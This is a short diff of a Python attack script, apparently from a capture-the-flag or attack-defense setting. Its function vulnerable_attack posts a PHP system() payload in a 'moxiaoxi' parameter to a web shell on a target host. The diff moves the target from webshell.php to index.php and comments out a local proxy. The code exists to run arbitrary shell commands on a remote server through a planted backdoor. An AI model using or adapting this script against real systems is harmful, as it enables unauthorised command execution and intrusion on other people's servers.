@@ -6,7 +6,7 @@ import traceback
 import requests
 
 proxies = {
-    "http": "http://127.0.0.1:8080"
+    #"http": "http://192.168.144.137:8080"
 }
 
 
@@ -20,7 +20,7 @@ def vulnerable_attack(target, target_port, cmd):
 
         session = requests.Session()
         paramsPOST = {"moxiaoxi": "system('{cmd}');".format(cmd=cmd)}
-        response = session.post("http://{}:{}/webshell.php".format(target, target_port), data=paramsPOST,
+        response = session.post("http://{}:{}/index.php".format(target, target_port), data=paramsPOST,
                                 proxies=proxies)
         res = response.content.decode()
         res = res.strip()
